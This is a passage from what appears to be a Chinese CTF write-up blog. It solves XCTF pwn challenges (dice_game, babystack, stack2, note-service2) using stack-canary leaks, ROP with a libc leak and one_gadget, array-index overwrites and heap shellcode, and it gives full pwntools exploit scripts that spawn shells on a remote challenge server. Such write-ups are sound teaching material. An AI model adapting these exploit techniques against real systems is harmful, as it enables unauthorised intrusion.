class="line">  *(_QWORD *)seed = time(0LL);                  // 随机种子</span><br><span class="line">  printf(&quot;Welcome, let me know your name: &quot;, a2);</span><br><span class="line">  fflush(stdout);</span><br><span class="line">  v6 = read(0, buf, 0x50uLL);//栈溢出</span><br><span class="line">  if ( v6 &lt;= 49 )                               // 字符长度小于等于49</span><br><span class="line">    buf[v6 - 1] = 0;                            // 最后一个字符替换为\x00</span><br><span class="line">  printf(&quot;Hi, %s. Let&#x27;s play a game.\n&quot;, buf);</span><br><span class="line">  fflush(stdout);</span><br><span class="line">  srand(seed[0]);</span><br><span class="line">…………</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这是个小范围的栈溢出，可以覆盖随机数 seed 。做到这里发现和这条题目完全一样：[guess_num](# guess_num)。</p><h4 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h4><p>固定随机数之后，就是 python c 的联合编程，用 <code>ctypes</code>实现。</p><p><code>rand</code>缺省种子参数时默认使用种子为：<code>0</code>。</p><h4 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&quot;124.126.19.106&quot;</span>,<span class="number">45292</span>)</span><br><span class="line"><span class="comment">#p = process(&quot;./dice_game&quot;)</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./dice_game&quot;</span>)</span><br><span class="line">libc = cdll.LoadLibrary(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;skye&#x27;</span>.ljust(<span class="number">0x40</span>,<span class="string">&#x27;a&#x27;</span>) + p64(<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;name:&quot;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">50</span>):</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Give me the point&#x27;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(libc.rand()%<span class="number">6</span>+<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="pwn1"><a href="#pwn1" class="headerlink" title="pwn1"></a>pwn1</h3><p>[collapse title=”展开查看详情” status=”false”]</p><p><strong>考点：栈溢出，canary绕过</strong></p><h4 id="基本情况-1"><a href="#基本情况-1" class="headerlink" title="基本情况"></a>基本情况</h4><p>程序实现功能是往栈上读写数据。</p><h5 id="保护措施-1"><a href="#保护措施-1" class="headerlink" title="保护措施"></a>保护措施</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Full RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><h5 id="栈溢出"><a href="#栈溢出" class="headerlink" title="栈溢出"></a>栈溢出</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">......</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    menu();</span><br><span class="line">    v3 = my_input();</span><br><span class="line">    <span class="keyword">switch</span> ( v3 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        <span class="built_in">puts</span>(&amp;s);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        read(<span class="number">0</span>, &amp;s, <span class="number">0x100</span>uLL);                  <span class="comment">// 栈溢出</span></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">......</span><br></pre></td></tr></table></figure><p>栈溢出空间还是比较大的。</p><h4 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h4><p>使用栈溢出覆盖 canary 最后一字节，读取出 canary ，成功绕过 canary 保护。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#leak canary</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x89</span></span><br><span class="line">add(payload)</span><br><span class="line">show()</span><br><span class="line">p.recvuntil(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x89</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">canary = u64(<span class="string">&#x27;\x00&#x27;</span>+p.recv(<span class="number">7</span>))</span><br><span class="line">log.success(<span class="string">&quot;canary:&quot;</span>+<span class="built_in">hex</span>(canary))</span><br></pre></td></tr></table></figure><p>题目没有预留后门，并提供 libc ，所以泄露 libc 调用 onegadget getshell 。泄露 libc 需要借助输出函数，即需要控制 rip 调用。</p><p>泄露 libc 还需要 rop 回到 main 执行下一步操作。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#leak libc</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x88</span> + p64(canary) + p64(<span class="number">0xdeadbeef</span>)</span><br><span class="line">payload += p64(pop_rdi) + p64(puts_got) + p64(puts_plt)</span><br><span class="line">payload += p64(start_addr)</span><br><span class="line">add(payload)</span><br><span class="line">leave()</span><br><span class="line">puts_leak=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">log.success(<span class="string">&quot;puts_leak:&quot;</span>+<span class="built_in">hex</span>(puts_leak))</span><br></pre></td></tr></table></figure><p>最后再次控制 rip 。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#get shell</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x88</span> + p64(canary) + p64(<span class="number">0xdeadbeef</span>)</span><br><span class="line">payload += p64(onegadget)</span><br><span class="line">add(payload)</span><br><span class="line">leave()</span><br></pre></td></tr></table></figure><h4 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&quot;./babystack&quot;)</span></span><br><span class="line">p = remote(<span class="string">&quot;124.126.19.106&quot;</span>,<span class="number">51939</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./babystack&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">context</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&quot;&gt;&gt; &quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.send(context)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>():</span></span><br><span class="line">    p.recvuntil(<span class="string">&quot;&gt;&gt; &quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leave</span>():</span></span><br><span class="line">    p.recvuntil(<span class="string">&quot;&gt;&gt; &quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#leak canary</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x89</span></span><br><span class="line">add(payload)</span><br><span class="line">show()</span><br><span class="line">p.recvuntil(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x89</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">canary = u64(<span class="string">&#x27;\x00&#x27;</span>+p.recv(<span class="number">7</span>))</span><br><span class="line">log.success(<span class="string">&quot;canary:&quot;</span>+<span class="built_in">hex</span>(canary))</span><br><span class="line"></span><br><span class="line"><span class="comment">#leak libc</span></span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">pop_rdi = <span class="number">0x0000000000400a93</span></span><br><span class="line">start_addr = <span class="number">0x400720</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x88</span> + p64(canary) + p64(<span class="number">0xdeadbeef</span>)</span><br><span class="line">payload += p64(pop_rdi) + p64(puts_got) + p64(puts_plt)</span><br><span class="line">payload += p64(start_addr)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">add(payload)</span><br><span class="line">leave()</span><br><span class="line">puts_leak=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">log.success(<span class="string">&quot;puts_leak:&quot;</span>+<span class="built_in">hex</span>(puts_leak))</span><br><span class="line"></span><br><span class="line">libc_base = puts_leak - libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">log.success(<span class="string">&quot;libc_base:&quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line">onegadget = libc_base + <span class="number">0x45216</span></span><br><span class="line">log.success(<span class="string">&quot;onegadget:&quot;</span>+<span class="built_in">hex</span>(onegadget))</span><br><span class="line"></span><br><span class="line"><span class="comment">#get shell</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x88</span> + p64(canary) + p64(<span class="number">0xdeadbeef</span>)</span><br><span class="line">payload += p64(onegadget)</span><br><span class="line"></span><br><span class="line">add(payload)</span><br><span class="line">leave()</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>[/collapse]</p><h3 id="stack2"><a href="#stack2" class="headerlink" title="stack2"></a>stack2</h3><blockquote><p>题目来源： XCTF 4th-QCTF-2018</p></blockquote><p>[collapse title=”展开查看详情” status=”false”]</p><p><strong>考点：数字下标溢出</strong></p><p>保护情况：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     i386-32-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure><p>漏洞函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;which number to change:&quot;</span>);          <span class="comment">// change</span></span><br><span class="line">__isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;index);<span class="comment">//没有检查下标</span></span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;new number:&quot;</span>);</span><br><span class="line">__isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;num);</span><br><span class="line">num_list[index] = num;</span><br></pre></td></tr></table></figure><p>程序中找到有预留的后门函数，所以通过数组越界修改返回地址到后门。所以需要寻找 num_list 与 eip 的偏移。</p><p>寻找 eip 在栈上地址比较容易，将断点打在 main 退出前（0x080488EF），查看寄存器值：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">────────────────────────────────────────────────────────────────────────────────────[ REGISTERS ]─────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line"> EAX  0x0</span><br><span class="line"> EBX  0x0</span><br><span class="line"> ECX  0xffffcfa0 ◂— 0x1</span><br><span class="line"> EDX  0xf7fb887c (_IO_stdfile_0_lock) ◂— 0x0</span><br><span class="line"> EDI  0xf7fb7000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1b1db0</span><br><span class="line"> ESI  0xf7fb7000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1b1db0</span><br><span class="line"> EBP  0x0</span><br><span class="line"><span class="meta"> #</span><span class="bash"> 返回地址在栈上位置</span></span><br><span class="line"> ESP  0xffffcf9c —▸ 0xf7e1d637 (__libc_start_main+247) ◂— add    esp, 0x10</span><br><span class="line"> EIP  0x80488f2 (main+802) ◂— 0x669066c3</span><br><span class="line">────────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]─────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line"> ► f 0  80488f2 main+802</span><br><span class="line">   f 1 f7e1d637 __libc_start_main+247</span><br><span class="line">──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span><br></pre></td></tr></table></figure><p>写入地址在写入或者 show 操作汇编打断点，下面在录入时打断点找：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">080486B</span>D                 call    ___isoc99_scanf</span><br><span class="line"><span class="number">080486</span>C2                 add     esp, <span class="number">10</span>h</span><br><span class="line"><span class="number">080486</span>C5                 mov     eax, [ebp+num]</span><br><span class="line"><span class="number">080486</span>CB                 mov     ecx, eax</span><br><span class="line"><span class="number">080486</span>CD                 lea     edx, [ebp+num_list]<span class="comment">//写入栈上</span></span><br><span class="line"><span class="number">080486</span>D0                 mov     eax, [ebp+var_7C]</span><br><span class="line"><span class="number">080486</span>D3                 add     eax, edx</span><br><span class="line"><span class="number">080486</span>D5                 mov     [eax], cl</span><br><span class="line"><span class="number">080486</span>D7                 add     [ebp+var_7C], <span class="number">1</span></span><br></pre></td></tr></table></figure><p>调试查看寄存器找到地址：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">────────────────────────────────────────────────────────────────────────────────────[ REGISTERS ]─────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line"> EAX  0x56</span><br><span class="line"> EBX  0x0</span><br><span class="line"> ECX  0x56</span><br><span class="line"><span class="meta"> #</span><span class="bash">写入地址</span></span><br><span class="line"> EDX  0xffffcf18 ◂— 0x45 /* &#x27;E&#x27; */</span><br><span class="line"> EDI  0xf7fb7000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1b1db0</span><br><span class="line"> ESI  0xf7fb7000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1b1db0</span><br><span class="line"> EBP  0xffffcf88 ◂— 0x0</span><br><span class="line"> ESP  0xffffcee0 —▸ 0xf7ffda74 —▸ 0xf7fd5470 —▸ 0xf7ffd918 ◂— 0x0</span><br><span class="line"> EIP  0x80486d0 (main+256) ◂— 0x184458b</span><br><span class="line">──────────────────────────────────────────────────────────────────────────────────────[ DISASM ]──────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">   0x80486c2 &lt;main+242&gt;    add    esp, 0x10</span><br><span class="line">   0x80486c5 &lt;main+245&gt;    mov    eax, dword ptr [ebp - 0x88]</span><br><span class="line">   0x80486cb &lt;main+251&gt;    mov    ecx, eax</span><br><span class="line">   0x80486cd &lt;main+253&gt;    lea    edx, [ebp - 0x70]</span><br><span class="line"> ► 0x80486d0 &lt;main+256&gt;    mov    eax, dword ptr [ebp - 0x7c]</span><br><span class="line">   0x80486d3 &lt;main+259&gt;    add    eax, edx</span><br><span class="line">   0x80486d5 &lt;main+261&gt;    mov    byte ptr [eax], cl</span><br><span class="line">   0x80486d7 &lt;main+263&gt;    add    dword ptr [ebp - 0x7c], 1</span><br><span class="line">   0x80486db &lt;main+267&gt;    mov    edx, dword ptr [ebp - 0x7c]</span><br><span class="line">   0x80486de &lt;main+270&gt;    mov    eax, dword ptr [ebp - 0x90]</span><br><span class="line">   0x80486e4 &lt;main+276&gt;    cmp    edx, eax</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>计算得出偏移：<code>0xffffcf9c</code>-<code>0xffffcf18</code>=<code>0x84</code></p><p><strong>后门函数只能本地打通，远程服务器没有 bash 指令。</strong>我就 ROP 和泄露 libc 地址了。看了大佬 wp 发现 <code>system(sh)</code>也能 getshell ，所以脚本如下：</p><p><strong>完整exp：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p = process(<span class="string">&quot;./stack2&quot;</span>)</span><br><span class="line">p = remote(<span class="string">&quot;124.126.19.106&quot;</span>,<span class="number">42070</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change</span>(<span class="params">index,context</span>):</span></span><br><span class="line">p.sendlineafter(<span class="string">&quot;exit&quot;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;change&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">p.sendlineafter(<span class="string">&quot;number&quot;</span>,<span class="built_in">str</span>(context))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;have:&quot;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">0x45</span>))</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">0x56</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">#system_plt</span></span><br><span class="line">change(<span class="number">0x84</span>+<span class="number">0</span>,<span class="number">0x50</span>)</span><br><span class="line">change(<span class="number">0x84</span>+<span class="number">1</span>,<span class="number">0x84</span>)</span><br><span class="line">change(<span class="number">0x84</span>+<span class="number">2</span>,<span class="number">0x04</span>)</span><br><span class="line">change(<span class="number">0x84</span>+<span class="number">3</span>,<span class="number">0x08</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#sh</span></span><br><span class="line">change(<span class="number">0x84</span>+<span class="number">8</span>,<span class="number">0x87</span>)</span><br><span class="line">change(<span class="number">0x84</span>+<span class="number">9</span>,<span class="number">0x89</span>)</span><br><span class="line">change(<span class="number">0x84</span>+<span class="number">10</span>,<span class="number">0x04</span>)</span><br><span class="line">change(<span class="number">0x84</span>+<span class="number">11</span>,<span class="number">0x08</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;exit&quot;</span>,<span class="string">&#x27;5&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>[/collapse]</p><h3 id="note-service2"><a href="#note-service2" class="headerlink" title="note-service2"></a>note-service2</h3><p>[collapse title=”展开查看详情” status=”false”]<br><strong>考点：堆上shellcode</strong></p><p>保护情况：NX 保护关闭</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX disabled</span><br><span class="line">PIE:      PIE enabled</span><br><span class="line">RWX:      Has RWX segments</span><br></pre></td></tr></table></figure><p>漏洞函数：存放堆指针的数组可越界存放。也就是堆指针可放置到任意地方。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">myadd</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> chunk_size; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  result = dword_20209C;</span><br><span class="line">  <span class="keyword">if</span> ( dword_20209C &gt;= <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    result = dword_20209C;</span><br><span class="line">    <span class="keyword">if</span> ( dword_20209C &lt;= <span class="number">11</span> )<span class="comment">//chunk上限11个</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;index:&quot;</span>);</span><br><span class="line">      v1 = getinput();</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;size:&quot;</span>);</span><br><span class="line">      result = getinput();</span><br><span class="line">      chunk_size = result;</span><br><span class="line">      <span class="keyword">if</span> ( result &gt;= <span class="number">0</span> &amp;&amp; result &lt;= <span class="number">8</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        qword_2020A0[v1] = <span class="built_in">malloc</span>(result);<span class="comment">//堆指针存放可越界</span></span><br><span class="line">        <span class="keyword">if</span> ( !qword_2020A0[v1] )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">&quot;malloc error&quot;</span>);</span><br><span class="line">          <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;content:&quot;</span>);</span><br><span class="line">        myread(qword_2020A0[v1], chunk_size);</span><br><span class="line">        result = dword_20209C++ + <span class="number">1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>程序没有 NX 保护，可以将 shellcode 存放在堆上，然后通过数组越界覆盖 got 表调用 shellcode 。</p><p>程序限制堆大小不超过 8 ，且读入数据函数会占用最后一个字节写入 <code>\x00</code> 。可写入空间仅有 7 ，所以需要用汇编的跳转指令 <code>jnz short xxx</code> ，对应的十六进制为：<code>EB xx</code>，其中 <code>xx</code> 为偏移量。偏移量计算公式为：<code>xx = 目标地址 - 当前地址 -2</code></p><p>程序申请一个 size 为 8 的堆结构如下：<a href="https://blog.csdn.net/seaaseesa/article/details/103003167">图源</a></p><p><img src="https://mrskye.cn-gd.ufileos.com/img/2020-04-28-L34hKzcbF5t0n8G3.png"></p><p>从 chunk 0 jmp 头开始计算：<code>xx</code>  = 2+1+8+8+8-2=0x19</p><p>构造一个调用 system 函数的shellcode ，然后数组越界覆盖一个可被控制输入参数的函数，例如 atoi ，传入参数 <code>/bin/sh\x00</code> 。这种构造方法要最后才修改 got 表，避免修改导致程序输入函数失效。</p><p>也可以到 shell-storm 找一个直接调用 <code>system(&#39;/bin/sh&#39;)</code> 的shellcode 一把梭哈。</p><p><strong>完整 exp</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span 